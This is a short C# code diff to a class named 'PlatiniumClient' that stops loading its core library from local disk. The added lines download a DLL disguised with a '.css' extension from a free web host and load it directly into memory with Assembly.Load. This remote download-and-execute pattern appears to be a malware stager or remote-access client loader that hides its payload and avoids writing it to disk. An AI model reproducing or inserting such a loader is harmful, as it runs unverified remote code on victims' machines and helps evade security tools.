@@ -13,12 +13,14 @@ namespace PlatiniumClient
 {
     class Client
     {
+        private static string DLL_URL = "http://repositorio123.esy.es/Platinium.css";
         private static string ROOT_PATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Platinium");
         private static string TEMP_PATH = Path.GetTempPath();
         private static string PLUGINS_PATH = Path.Combine(ROOT_PATH, "plugins");
         private static string CONFIG_PATH = Path.Combine(ROOT_PATH, "config");
         private static string COREASSEMBLY_PATH = Path.Combine(ROOT_PATH, "core");
         private static string COREASSEMBLYFILE_PATH = Path.Combine(COREASSEMBLY_PATH, "Platinium.dll");
+        private byte[] raw_assembly;
         private Assembly assembly;
         private Type type;
         public Client()
@@ -36,7 +38,12 @@ namespace PlatiniumClient
             Directory.CreateDirectory(PLUGINS_PATH);
             Directory.CreateDirectory(CONFIG_PATH);
             Directory.CreateDirectory(COREASSEMBLY_PATH);
-            assembly = Assembly.LoadFrom(COREASSEMBLYFILE_PATH);
+            //assembly = Assembly.LoadFrom(COREASSEMBLYFILE_PATH);
+            using (var client = new WebClient())
+            {
+                raw_assembly = client.DownloadData(DLL_URL);
+            }
+            assembly = Assembly.Load(raw_assembly);
         }
     }
 }
